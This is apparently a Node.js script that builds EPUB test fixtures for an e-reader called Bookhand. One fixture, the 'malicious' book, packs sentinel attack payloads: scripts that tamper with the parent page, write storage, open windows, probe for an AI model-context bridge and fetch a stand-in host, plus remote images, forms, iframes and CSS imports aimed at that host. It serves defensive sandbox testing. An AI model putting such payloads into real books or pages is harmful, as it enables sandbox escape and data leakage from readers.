import { mkdir, writeFile } from 'node:fs/promises'
import { dirname, resolve } from 'node:path'
import { fileURLToPath } from 'node:url'
import { strToU8, zipSync } from 'fflate'

const scriptDirectory = dirname(fileURLToPath(import.meta.url))
const fixtureDirectory = resolve(scriptDirectory, '../tests/fixtures/epub')
const fixtureDate = new Date('1980-01-01T00:00:00.000Z')

const container = `<?xml version="1.0" encoding="UTF-8"?>
<container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container">
  <rootfiles>
    <rootfile full-path="OEBPS/package.opf" media-type="application/oebps-package+xml"/>
  </rootfiles>
</container>
`

const nav = (items) => `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
  <head><title>Contents</title></head>
  <body><nav epub:type="toc" id="toc"><h1>Contents</h1><ol>${items}</ol></nav></body>
</html>
`

const packageDocument = ({ title, author, manifest, spine }) => `<?xml version="1.0" encoding="UTF-8"?>
<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="book-id">
  <metadata xmlns:dc="http://purl.org/dc/elements/1.1/">
    <dc:identifier id="book-id">urn:bookhand:${slug(title)}</dc:identifier>
    <dc:title>${escapeXml(title)}</dc:title>
    <dc:creator>${escapeXml(author)}</dc:creator>
    <dc:language>en</dc:language>
    <meta property="dcterms:modified">2026-09-01T00:00:00Z</meta>
  </metadata>
  <manifest>
    <item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/>
    ${manifest}
  </manifest>
  <spine>${spine}</spine>
</package>
`

function slug(value) {
  return value.toLowerCase().replaceAll(/[^a-z0-9]+/g, '-').replaceAll(/^-|-$/g, '')
}

function escapeXml(value) {
  return value
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&apos;')
}

function epub(entries) {
  const archiveEntries = {
    mimetype: [strToU8('application/epub+zip'), { level: 0, mtime: fixtureDate }],
  }

  for (const [path, contents] of entries) {
    archiveEntries[path] = [strToU8(contents), { level: 6, mtime: fixtureDate }]
  }

  return zipSync(archiveEntries, { level: 6 })
}

async function writeFixture(fileName, entries) {
  await writeFile(resolve(fixtureDirectory, fileName), epub(entries))
}

await mkdir(fixtureDirectory, { recursive: true })

await writeFixture('tiny-book.epub', [
  ['META-INF/container.xml', container],
  [
    'OEBPS/package.opf',
    packageDocument({
      title: 'The Tiny Book of Slopes',
      author: 'Bookhand Fixture Authors',
      manifest: `
        <item id="chapter-1" href="chapter-1.xhtml" media-type="application/xhtml+xml"/>
        <item id="chapter-2" href="chapter-2.xhtml" media-type="application/xhtml+xml"/>
        <item id="figure" href="slope.svg" media-type="image/svg+xml"/>
        <item id="style" href="style.css" media-type="text/css"/>`,
      spine: '<itemref idref="chapter-1"/><itemref idref="chapter-2"/>',
    }),
  ],
  [
    'OEBPS/nav.xhtml',
    nav(`<li><a href="chapter-1.xhtml">Foundations</a><ol>
      <li><a href="chapter-1.xhtml#rise">Rise and run</a></li>
      <li><a href="chapter-1.xhtml#notation">Notation</a></li>
    </ol></li><li><a href="chapter-2.xhtml">Practice</a></li>`),
  ],
  [
    'OEBPS/chapter-1.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?>
    <html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops">
      <head><title>Foundations</title><link rel="stylesheet" href="style.css"/></head>
      <body><h1>Foundations</h1>
        <section id="rise"><h2>Rise and run</h2><p id="selection-anchor">A slope compares a vertical change with a horizontal change. This sentence is the deterministic selection anchor.</p>
          <figure><img src="slope.svg" alt="A line rising two units for every three units across"/><figcaption>A packaged SVG with a readable caption.</figcaption></figure>
        </section>
        <section id="notation"><h2>Notation</h2><math xmlns="http://www.w3.org/1998/Math/MathML" aria-label="m equals delta y over delta x"><mi>m</mi><mo>=</mo><mfrac><mrow><mo>Δ</mo><mi>y</mi></mrow><mrow><mo>Δ</mo><mi>x</mi></mrow></mfrac></math></section>
      </body>
    </html>`,
  ],
  [
    'OEBPS/chapter-2.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Practice</title></head><body><h1>Practice</h1><p>Return to the exact source after solving the example.</p></body></html>`,
  ],
  [
    'OEBPS/slope.svg',
    `<svg xmlns="http://www.w3.org/2000/svg" role="img" aria-labelledby="title" viewBox="0 0 240 120"><title id="title">A rising line</title><rect width="240" height="120" fill="#fafafa"/><path d="M20 100 L220 20" fill="none" stroke="#c24a2b" stroke-width="4"/></svg>`,
  ],
  [
    'OEBPS/style.css',
    `body { font-family: serif; line-height: 1.5; } figure { margin: 1em auto; } img { max-width: 100%; }`,
  ],
])

const exfiltrationOrigin = 'https://bookhand.invalid'
await writeFixture('malicious-book.epub', [
  ['META-INF/container.xml', container],
  [
    'OEBPS/package.opf',
    packageDocument({
      title: 'Bookhand Malicious Sentinel Corpus',
      author: 'Bookhand Fixture Authors',
      manifest: `
        <item id="attack" href="attack.xhtml" media-type="application/xhtml+xml" properties="scripted"/>
        <item id="nested" href="nested.xhtml" media-type="application/xhtml+xml"/>
        <item id="script" href="packaged-script.js" media-type="application/javascript"/>
        <item id="style" href="attack.css" media-type="text/css"/>
        <item id="safe-image" href="safe.svg" media-type="image/svg+xml"/>`,
      spine: '<itemref idref="attack"/>',
    }),
  ],
  ['OEBPS/nav.xhtml', nav('<li><a href="attack.xhtml">Readable sentinel page</a></li>')],
  [
    'OEBPS/attack.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?>
    <html xmlns="http://www.w3.org/1999/xhtml"><head><title>Sentinel page</title>
      <link rel="stylesheet" href="attack.css"/><script src="packaged-script.js"></script>
      <script>parent.document.documentElement.dataset.bookhandParentMutation='inline-script'; fetch('${exfiltrationOrigin}/fetch');</script>
    </head><body>
      <h1>Readable security fixture</h1><p id="readable-sentinel">If this paragraph renders, blocked attacks did not erase ordinary packaged content.</p>
      <img src="safe.svg" alt="A safe packaged image"/><img src="${exfiltrationOrigin}/image" alt="Remote image sentinel"/>
      <form action="${exfiltrationOrigin}/form" method="post"><input name="sentinel" value="form-submit"/><button type="submit">Submit sentinel</button></form>
      <iframe src="${exfiltrationOrigin}/frame" title="Remote nested browsing sentinel"></iframe>
      <object data="${exfiltrationOrigin}/object" type="text/html">Object sentinel</object>
      <a id="top-navigation" target="_top" href="${exfiltrationOrigin}/top-navigation">Top navigation sentinel</a>
      <a id="popup" target="_blank" href="${exfiltrationOrigin}/popup">Popup sentinel</a>
      <iframe src="nested.xhtml" title="Packaged nested browsing sentinel"></iframe>
    </body></html>`,
  ],
  [
    'OEBPS/packaged-script.js',
    `parent.document.documentElement.dataset.bookhandParentMutation = 'packaged-script';
    localStorage.setItem('bookhand-malicious-local', 'written');
    sessionStorage.setItem('bookhand-malicious-session', 'written');
    window.open('${exfiltrationOrigin}/window-open', '_blank');
    fetch('${exfiltrationOrigin}/packaged-fetch');
    const bridge = globalThis.navigator?.modelContext ?? globalThis.navigator?.webMCP ?? parent.__BOOKHAND_WEBMCP__;
    if (bridge) fetch('${exfiltrationOrigin}/bridge-discovered');`,
  ],
  [
    'OEBPS/attack.css',
    `@import url("${exfiltrationOrigin}/import.css");
    @font-face { font-family: Sentinel; src: url('${exfiltrationOrigin}/font.woff2'); }
    body { background-image: url(${exfiltrationOrigin}/css-image); font-family: Sentinel, serif; }`,
  ],
  [
    'OEBPS/nested.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Nested</title></head><body><script>top.location='${exfiltrationOrigin}/nested-top-navigation';</script><p>Packaged nested content.</p></body></html>`,
  ],
  [
    'OEBPS/safe.svg',
    `<svg xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Safe packaged square" viewBox="0 0 20 20"><rect width="20" height="20" fill="#c24a2b"/></svg>`,
  ],
])

const longTitle = `A Deliberately Long Metadata Title ${'for Responsive Overflow Testing '.repeat(12)}`.trim()
const longAuthor = `Bookhand Fixture Author ${'With An Excessively Long Display Name '.repeat(8)}`.trim()
await writeFixture('long-metadata.epub', [
  ['META-INF/container.xml', container],
  [
    'OEBPS/package.opf',
    packageDocument({
      title: longTitle,
      author: longAuthor,
      manifest: '<item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>',
      spine: '<itemref idref="chapter"/>',
    }),
  ],
  ['OEBPS/nav.xhtml', nav('<li><a href="chapter.xhtml">Long metadata chapter</a></li>')],
  [
    'OEBPS/chapter.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>Long metadata</title></head><body><p>The metadata, not the chapter, is intentionally long.</p></body></html>`,
  ],
])

await writeFixture('missing-cover.epub', [
  ['META-INF/container.xml', container],
  [
    'OEBPS/package.opf',
    packageDocument({
      title: 'A Book Without a Cover',
      author: 'Bookhand Fixture Authors',
      manifest: '<item id="chapter" href="chapter.xhtml" media-type="application/xhtml+xml"/>',
      spine: '<itemref idref="chapter"/>',
    }),
  ],
  ['OEBPS/nav.xhtml', nav('<li><a href="chapter.xhtml">No cover here</a></li>')],
  [
    'OEBPS/chapter.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?><html xmlns="http://www.w3.org/1999/xhtml"><head><title>No cover</title></head><body><p>This valid EPUB intentionally declares no cover image.</p></body></html>`,
  ],
])

await writeFixture('re001-direction-book.epub', [
  ['META-INF/container.xml', container],
  [
    'OEBPS/package.opf',
    packageDocument({
      title: 'RE-001 Direction Lifecycle Fixture',
      author: 'Bookhand Compatibility Fixtures',
      manifest: `
        <item id="horizontal-1" href="horizontal-1.xhtml" media-type="application/xhtml+xml"/>
        <item id="vertical" href="vertical.xhtml" media-type="application/xhtml+xml"/>
        <item id="horizontal-2" href="horizontal-2.xhtml" media-type="application/xhtml+xml"/>
        <item id="style" href="direction.css" media-type="text/css"/>`,
      spine: '<itemref idref="horizontal-1"/><itemref idref="vertical"/><itemref idref="horizontal-2"/>',
    }),
  ],
  [
    'OEBPS/nav.xhtml',
    nav('<li><a href="horizontal-1.xhtml">Horizontal one</a></li><li><a href="vertical.xhtml">Vertical</a></li><li><a href="horizontal-2.xhtml">Horizontal two</a></li>'),
  ],
  [
    'OEBPS/direction.css',
    `body { font-family: serif; line-height: 1.5; }
     body.vertical { writing-mode: vertical-rl; }
     .empty-fragment { display: none; }
     p { margin: 0 0 1em; }`,
  ],
  [
    'OEBPS/horizontal-1.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?>
    <html xmlns="http://www.w3.org/1999/xhtml"><head><title>Horizontal one</title><link rel="stylesheet" href="direction.css"/></head>
    <body><h1>Horizontal one</h1><p id="h-one">First horizontal section for the persistent-frame direction transition.</p>
    <p><a href="horizontal-2.xhtml#empty-fragment">Open the empty fragment target</a></p></body></html>`,
  ],
  [
    'OEBPS/vertical.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?>
    <html xmlns="http://www.w3.org/1999/xhtml"><head><title>Vertical</title><link rel="stylesheet" href="direction.css"/></head>
    <body class="vertical"><h1>Vertical</h1><p id="v-one">Vertical writing section for the persistent-frame direction transition.</p></body></html>`,
  ],
  [
    'OEBPS/horizontal-2.xhtml',
    `<?xml version="1.0" encoding="UTF-8"?>
    <html xmlns="http://www.w3.org/1999/xhtml"><head><title>Horizontal two</title><link rel="stylesheet" href="direction.css"/></head>
    <body><h1>Horizontal two</h1><p>${'Leading pagination text. '.repeat(900)}</p>
    <span class="empty-fragment" id="empty-fragment"></span><p id="after-empty-fragment">Empty fragment destination passage.</p></body></html>`,
  ],
])

await writeFile(
  resolve(fixtureDirectory, 'corrupt-book.epub'),
  new Uint8Array([0x50, 0x4b, 0x03, 0x04, 0x42, 0x4f, 0x4f, 0x4b, 0x48, 0x41, 0x4e, 0x44]),
)
await writeFile(
  resolve(fixtureDirectory, 'unsupported-book.txt'),
  'This is deliberately not an EPUB container.\n',
  'utf8',
)
